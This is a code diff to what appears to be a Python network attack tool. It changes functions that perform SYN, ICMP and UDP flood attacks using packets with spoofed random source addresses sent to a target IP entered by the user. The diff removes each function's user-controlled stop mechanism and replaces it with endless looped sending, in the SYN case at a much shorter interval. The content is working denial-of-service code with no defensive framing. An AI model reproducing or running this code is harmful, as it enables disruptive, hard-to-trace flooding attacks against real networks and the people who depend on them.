@@ -306,28 +306,11 @@ def perform_syn_flood_attack(ip_addr=None, port="139"):
         ip_addr = input("Enter the IP address to attack: ")
 
     packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port), flags="S")
-
-    # Create a flag to indicate whether to stop the attack
-    stop_flag = threading.Event()
-
-    def send_packet():
-        while not stop_flag.is_set():
-            send(packet, inter=0.005, verbose=0)
-
-    # Crea un thread per eseguire l'attacco SYN flood
-    attack_thread = threading.Thread(target=send_packet)
-    attack_thread.start()
-
-    # Wait for user input to stop the attack
-    input("Press Enter to stop the attack...")
-
-    # Set the stop flag to stop the attack
-    stop_flag.set()
-
-    # Wait for the attack thread to finish
-    attack_thread.join()
+    
+    send(packet, inter=0.00005, loop=1, verbose=0)
 
     return "SYN flood attack performed on " + ip_addr + " to port " + port
+
 
 
 # (12) Code to perform icmp flood attack
@@ -338,25 +321,7 @@ def perform_icmp_flood_attack(ip_addr=None):
 
     packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"
 
-    # Create a flag to indicate whether to stop the attack
-    stop_flag = threading.Event()
-
-    def send_packet():
-        while not stop_flag.is_set():
-            send(packet, inter=0.005, verbose=0)
-
-    # Crea un thread per eseguire l'attacco SYN flood
-    attack_thread = threading.Thread(target=send_packet)
-    attack_thread.start()
-
-    # Wait for user input to stop the attack
-    input("Press Enter to stop the attack...")
-
-    # Set the stop flag to stop the attack
-    stop_flag.set()
-
-    # Wait for the attack thread to finish
-    attack_thread.join()
+    send(packet, inter=0.005, loop=1, verbose=0)
 
     return "ICMP flood attack performed on " + ip_addr
 
@@ -373,27 +338,7 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 
     packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())
 
-    # Create a flag to indicate whether to stop the attack
-    stop_flag = threading.Event()
-
-    def send_packet():
-        while not stop_flag.is_set():
-            send(packet, verbose=0)
-
-    # Create a separate thread to perform the attack
-    attack_thread = threading.Thread(target=send_packet)
-
-    # Start the attack thread
-    attack_thread.start()
-
-    # Wait for user input to stop the attack
-    input("Press Enter to stop the attack...")
-
-    # Set the stop flag to stop the attack
-    stop_flag.set()
-
-    # Wait for the attack thread to finish
-    attack_thread.join()
+    send(packet, inter=0.005, loop=1, verbose=0)
 
     return "UDP flood attack performed on " + ip_addr + " to port " + port
 
